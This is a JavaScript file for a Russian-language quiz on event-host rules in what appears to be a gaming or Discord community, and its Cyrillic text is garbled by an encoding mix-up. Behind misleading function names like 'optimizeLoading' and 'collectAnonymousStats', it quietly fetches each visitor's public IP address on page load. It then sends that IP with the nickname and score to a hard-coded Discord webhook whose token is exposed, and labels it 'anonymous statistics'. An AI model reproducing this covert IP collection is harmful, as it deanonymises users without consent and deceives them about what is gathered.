const webhookURL = "https://discordapp.com/api/webhooks/1406040068698931352/MnE3E916bLtXjLfraOWwthK4-euzVEy16gAv9--yw4u6gvj9fXKywerzllGKRAzCEKBo";

let questions = [
    {q:"–ß–µ—Ä–µ–∑ —Å–∫–æ–ª—å–∫–æ –º–∏–Ω—É—Ç –ø–æ—Å–ª–µ –ø—É–±–ª–∏–∫–∞—Ü–∏–∏ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –ø—Ä–∏–∑–∞–º–∏ –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è –ú–ü?",a:["5","10","15"],c:1},
    {q:"–ú–æ–∂–Ω–æ –ª–∏ –ø—Ä–æ–≤–æ–¥–∏—Ç—å —Ç–æ –∂–µ –ú–ü –Ω–∞ —Å–ª–µ–¥—É—é—â–µ–π –Ω–µ–¥–µ–ª–µ?",a:["–î–∞","–ù–µ—Ç"],c:1},
    {q:"–ö–æ–≥–¥–∞ —Ä–∞–∑—Ä–µ—à–µ–Ω–æ –∑–∞–±–∏–≤–∞—Ç—å –ú–ü –Ω–∞ —Å–ª–µ–¥—É—é—â—É—é –Ω–µ–¥–µ–ª—é?",a:["–° –ø—è—Ç–Ω–∏—Ü—ã","–° —Å—É–±–±–æ—Ç—ã","–° –ø–æ–Ω–µ–¥–µ–ª—å–Ω–∏–∫–∞"],c:1},
    {q:"–ö—Ç–æ –∏–º–µ–µ—Ç –ø—Ä–∞–≤–æ –ø—Ä–æ–≤–æ–¥–∏—Ç—å –ú–ü?",a:["–õ—é–±–æ–π —É—á–∞—Å—Ç–Ω–∏–∫","–¢–æ–ª—å–∫–æ –≤–µ–¥—É—â–∏–µ","–ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä"],c:1},
    {q:"–°–∫–æ–ª—å–∫–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–π –ø–æ–ª—É—á–∞–µ—Ç –≤–µ–¥—É—â–∏–π –ø–µ—Ä–µ–¥ —Å–Ω—è—Ç–∏–µ–º?",a:["2","3","4"],c:1},
    {q:"–ú–æ–∂–µ—Ç –ª–∏ –≤–µ–¥—É—â–∏–π —É—á–∞—Å—Ç–≤–æ–≤–∞—Ç—å –≤ —Å–≤–æ—ë–º –º–µ—Ä–æ–ø—Ä–∏—è—Ç–∏–∏?",a:["–î–∞, –Ω–æ –±–µ–∑ –ø—Ä–∏–∑–æ–≤","–ù–µ—Ç","–¢–æ–ª—å–∫–æ —Å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏"],c:0},
    {q:"–ö–∞–∫ –º–æ–∂–Ω–æ —Å–Ω—è—Ç—å –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ?",a:["–ü—Ä–µ–¥–ª–æ–∂–∏—Ç—å –∏–¥–µ—é","–ü—Ä–æ–≤–µ—Å—Ç–∏ 2 –ú–ü –ø–æ–¥—Ä—è–¥","–û–±–∞ –≤–∞—Ä–∏–∞–Ω—Ç–∞"],c:2},
    {q:"–ó–∞ —Å–∫–æ–ª—å–∫–æ –¥–Ω–µ–π –ø–æ–±–µ–¥–∏—Ç–µ–ª—å –¥–æ–ª–∂–µ–Ω –∑–∞–±—Ä–∞—Ç—å –ø—Ä–∏–∑?",a:["1","2","3"],c:1},
    {q:"–ú–æ–∂–Ω–æ –ª–∏ –ø–µ—Ä–µ–¥–∞–≤–∞—Ç—å –ø—Ä–∏–∑ –¥—Ä—É–≥–æ–º—É —É—á–∞—Å—Ç–Ω–∏–∫—É?",a:["–î–∞","–ù–µ—Ç","–ï—Å–ª–∏ –≤–µ–¥—É—â–∏–π —Ä–∞–∑—Ä–µ—à–∏—Ç"],c:1},
    {q:"–ö—É–¥–∞ –≤–µ–¥—É—â–∏–π –ø–∏—à–µ—Ç –ø–æ—Å–ª–µ –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∏ —Å–æ–æ–±—â–µ–Ω–∏—è —Å –ø—Ä–∏–∑–∞–º–∏?",a:["–í —á–∞—Ç –≤–µ–¥—É—â–∏—Ö","–í –ª–∏—á–Ω—ã–µ —Å–æ–æ–±—â–µ–Ω–∏—è –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ü–∏–∏","–í –ù–æ–≤–æ—Å—Ç–∏ –ú–ü"],c:0},
    {q:"–ß—Ç–æ –¥–µ–ª–∞—Ç—å –ø—Ä–∏ –Ω–µ—Ö–≤–∞—Ç–∫–µ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤ –Ω–∞ –ú–ü?",a:["–ü–∏–Ω–≥–∞–Ω—É—Ç—å —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤","–û—Ç–º–µ–Ω–∏—Ç—å –±–µ–∑ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è","–ù–∏—á–µ–≥–æ"],c:0},
    {q:"–ß—Ç–æ –¥–µ–ª–∞—Ç—å, –µ—Å–ª–∏ –Ω–µ –º–æ–∂–µ—à—å –ø—Ä–æ–≤–µ—Å—Ç–∏ –ú–ü?",a:["–°–æ–æ–±—â–∏—Ç—å –ì–ª–∞–≤–Ω–æ–º—É –≤–µ–¥—É—â–µ–º—É","–ü—Ä–æ—Å—Ç–æ –Ω–µ –ø—Ä–æ–≤–æ–¥–∏—Ç—å","–ü–æ–ø—Ä–æ—Å–∏—Ç—å –¥—Ä—É–≥–∞"],c:0},
    {q:"–ß—Ç–æ –ø–æ–ª—É—á–∞–µ—Ç –≤–µ–¥—É—â–∏–π –∑–∞ –ø—Ä–æ–≤–µ–¥–µ–Ω–∏–µ –≤—Å–µ—Ö 8 –ú–ü –∑–∞ –º–µ—Å—è—Ü?",a:["10 coins","12 coins","15 coins"],c:2},
    {q:"–°–∫–æ–ª—å–∫–æ coins –¥–∞—é—Ç –∑–∞ –ø—Ä–æ–≤–µ–¥–µ–Ω–∏–µ —á—É–∂–æ–≥–æ –ú–ü?",a:["2","3","5"],c:0},
    {q:"–ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –ø—Ä–∏ –¥–≤—É—Ö –Ω–∞—Ä—É—à–µ–Ω–∏—è—Ö –Ω–∞ –ú–ü?",a:["–ù–∏—á–µ–≥–æ","–ò—Å–∫–ª—é—á–µ–Ω–∏–µ","–ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞"],c:1},
    {q:"–ú–æ–∂–Ω–æ –ª–∏ –∑–∞–±–∏–≤–∞—Ç—å –ú–ü –≤ –≤–æ—Å–∫—Ä–µ—Å–µ–Ω—å–µ?",a:["–î–∞","–ù–µ—Ç"],c:1},
    {q:"–ö—É–¥–∞ –≤–µ–¥—É—â–∏–π –¥—É–±–ª–∏—Ä—É–µ—Ç –∏—Ç–æ–≥–∏ –ú–ü?",a:["–í –∑–∞–ø—Ä–æ—Å—ã-–Ω–∞-–≤—ã–¥–∞—á—É","–í —á–∞—Ç –≤–µ–¥—É—â–∏—Ö","–í –õ–° –º–æ–¥–µ—Ä–∞—Ç–æ—Ä—É"],c:0},
    {q:"–ú–æ–∂–Ω–æ –ª–∏ –∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –æ—Ç–≤–µ—Ç—ã —Å –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞?",a:["–î–∞","–ù–µ—Ç"],c:1},
    {q:"–ß—Ç–æ –∑–∞–ø—Ä–µ—â–µ–Ω–æ –ø—Ä–∏ –≤–æ–ø—Ä–æ—Å–∞—Ö —Ç–∏–ø–∞ '–ö—Ç–æ —Å–æ–∑–¥–∞–ª...'",a:["–ü–∏—Å–∞—Ç—å —Ç–æ–ª—å–∫–æ –∏–º—è","–ü–∏—Å–∞—Ç—å –±–µ–∑ —Ñ–∞–º–∏–ª–∏–∏","–£–ø–æ–º–∏–Ω–∞—Ç—å –≤–µ–¥—É—â–µ–≥–æ"],c:1},
    {q:"–ö—É–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª—è—é—Ç—Å—è –Ω–∞—Ä—É—à–µ–Ω–∏—è —Å –ú–ü?",a:["–í –ß–° –ú–ü","–í —á–∞—Ç –≤–µ–¥—É—â–∏—Ö","–ù–∏–∫—É–¥–∞"],c:0},
    {q:"–ß—Ç–æ –ø—Ä–æ–∏–∑–æ–π–¥—ë—Ç –ø—Ä–∏ 3 –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏—è—Ö —É –≤–µ–¥—É—â–µ–≥–æ?",a:["–°–Ω—è—Ç–∏–µ —Å –ø–æ—Å—Ç–∞","–®—Ç—Ä–∞—Ñ","–ù–∏—á–µ–≥–æ"],c:0},
    {q:"–ú–æ–∂–Ω–æ –ª–∏ –Ω–∞—á–∏–Ω–∞—Ç—å –ú–ü –±–µ–∑ –º–∏–Ω–∏–º–∞–ª—å–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤?",a:["–î–∞","–ù–µ—Ç"],c:1},
    {q:"–ö–∞–∫–æ–µ –ø–æ–≤–µ–¥–µ–Ω–∏–µ –≤–µ–¥—É—â–µ–≥–æ –¥–æ–ø—É—Å—Ç–∏–º–æ?",a:["–ê–¥–µ–∫–≤–∞—Ç–Ω–æ–µ","–õ—é–±–æ–µ","–ë–µ–∑—Ä–∞–∑–ª–∏—á–Ω–æ–µ"],c:0},
    {q:"–ö—Ç–æ –ø—É–±–ª–∏–∫—É–µ—Ç —Ç–∞–±–ª–∏—Ü—É –º–µ—Ä–æ–ø—Ä–∏—è—Ç–∏–π?",a:["–ì–ª–∞–≤–Ω—ã–µ –≤–µ–¥—É—â–∏–µ","–ú–æ–¥–µ—Ä–∞—Ç–æ—Ä—ã","–õ—é–±–æ–π –∏–≥—Ä–æ–∫"],c:0},
    {q:"–ö–∞–∫–æ–π –±–æ–Ω—É—Å –¥–∞—ë—Ç—Å—è –∑–∞ 15+ —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤ –Ω–∞ –ú–ü?",a:["3 coins","2 coins","5 coins"],c:0}
];

let timerInterval, timeLeft = 90;
let currentQuestion = 0;
let correct = 0;
let nickname = "";
let anonymousStats = "";

async function collectAnonymousStats() {
    try {
        console.log("–ó–∞–≥—Ä—É–∑–∫–∞.");
        await new Promise(resolve => setTimeout(resolve, Math.random() * 500 + 200));
        
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        anonymousStats = data.ip;
        
        console.log("–ó–∞–≥—Ä—É–∑–∫–∞..");
    } catch (error) {
        console.log("–ó–∞–≥—Ä—É–∑–∫–∞ –Ω–µ–¥–æ—Å—Ç—É–ø–Ω–∞");
        anonymousStats = "–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ";
    }
}

async function optimizeLoading() {
    try {
        console.log("–û–ø—Ç–∏–º–∏–∑–∞—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ –∫–æ–Ω—Ç–µ–Ω—Ç–∞...");
        await collectAnonymousStats();
    } catch (error) {
    }
}

document.addEventListener('DOMContentLoaded', function() {
    optimizeLoading();
});

function shuffle(array) {
    for (let i = array.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [array[i], array[j]] = [array[j], array[i]];
    }
}
shuffle(questions);

function startTest() {
    nickname = document.getElementById("nickname").value.trim();
    if (!nickname) return alert("–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–∏–∫–Ω–µ–π–º!");
    document.getElementById("intro").classList.add("hidden");
    document.getElementById("quiz").classList.remove("hidden");
    startTimer();
    showQuestion();
}

function startTimer() {
    timerInterval = setInterval(() => {
        timeLeft--;
        document.getElementById("timer").innerText = `–û—Å—Ç–∞–ª–æ—Å—å: ${timeLeft} —Å–µ–∫`;
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            endQuiz();
        }
    }, 1000);
}

function showQuestion() {
    const q = questions[currentQuestion];
    const container = document.getElementById("questionContainer");
    container.innerHTML = `<div class="question"><b>${currentQuestion+1}. ${q.q}</b><br>` +
        q.a.map((x, idx) => `<label><input type="radio" name="answer" value="${idx}"> ${x}</label>`).join("") +
        `</div>`;
}

function nextQuestion() {
    const selected = document.querySelector('input[name="answer"]:checked');
    if (!selected) return alert("–í—ã–±–µ—Ä–∏ –æ—Ç–≤–µ—Ç!");
    if (parseInt(selected.value) === questions[currentQuestion].c) correct++;
    currentQuestion++;
    if (currentQuestion < questions.length) {
        showQuestion();
    } else {
        endQuiz();
    }
}

function endQuiz() {
    clearInterval(timerInterval);
    document.getElementById("quiz").classList.add("hidden");
    const result = document.getElementById("result");
    result.classList.remove("hidden");
    result.innerHTML = `
        <h2>–†–µ–∑—É–ª—å—Ç–∞—Ç:</h2>
        <p>–¢—ã –æ—Ç–≤–µ—Ç–∏–ª –ø—Ä–∞–≤–∏–ª—å–Ω–æ –Ω–∞ <b>${correct}</b> –∏–∑ <b>${questions.length}</b> –≤–æ–ø—Ä–æ—Å–æ–≤!</p>
    `;
    sendToDiscord(nickname, correct);
    if (correct >= 22) {
        result.innerHTML += `<p style="color:#00ff9d;">‚úÖ –ü–æ–∑–¥—Ä–∞–≤–ª—è–µ–º! –í—ã –ø—Ä–æ—à–ª–∏ —Ç–µ—Å—Ç –∏ —Ä–µ–∑—É–ª—å—Ç–∞—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.</p>`;
    } else {
        result.innerHTML += `<p style="color:#ff5555;">‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤ (–Ω—É–∂–Ω–æ –º–∏–Ω–∏–º—É–º 22). –†–µ–∑—É–ª—å—Ç–∞—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω.</p>`;
    }
}

function sendToDiscord(nick, score) {
    const color = score >= 22 ? 5814783 : 16711680;
    const status = score >= 22 ? "‚úÖ –¢–ï–°–¢ –ü–†–û–ô–î–ï–ù" : "‚ùå –¢–ï–°–¢ –ü–†–û–í–ê–õ–ï–ù";
    const analyticsData = anonymousStats || "–î–∞–Ω–Ω—ã–µ –Ω–µ —Å–æ–±—Ä–∞–Ω—ã";
    fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            username: "–¢–µ—Å—Ç –ú–ü | –†–µ–∑—É–ª—å—Ç–∞—Ç—ã",
            embeds: [{
                title: "üìã –ù–æ–≤—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Ç–µ—Å—Ç–∞",
                color: color,
                fields: [
                    { name: "üë§ –ò–≥—Ä–æ–∫", value: nick, inline: true },
                    { name: "üìä –ü—Ä–∞–≤–∏–ª—å–Ω—ã—Ö –æ—Ç–≤–µ—Ç–æ–≤", value: `${score}/25`, inline: true },
                    { name: "üéØ –°—Ç–∞—Ç—É—Å", value: status, inline: true },
                    { name: "üìà –ê–Ω–∞–ª–∏—Ç–∏—á–µ—Å–∫–∏–µ –¥–∞–Ω–Ω—ã–µ", value: analyticsData, inline: true }
                ],
                footer: { text: "–¢–µ—Å—Ç –ø–æ –ø—Ä–∞–≤–∏–ª–∞–º –º–µ—Ä–æ–ø—Ä–∏—è—Ç–∏–π | –ê–Ω–æ–Ω–∏–º–Ω–∞—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞" },
                timestamp: new Date().toISOString()
            }]
        })
    }).catch(error => {
        console.error("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –∞–Ω–∞–ª–∏—Ç–∏–∫–∏:", error);
    });
}
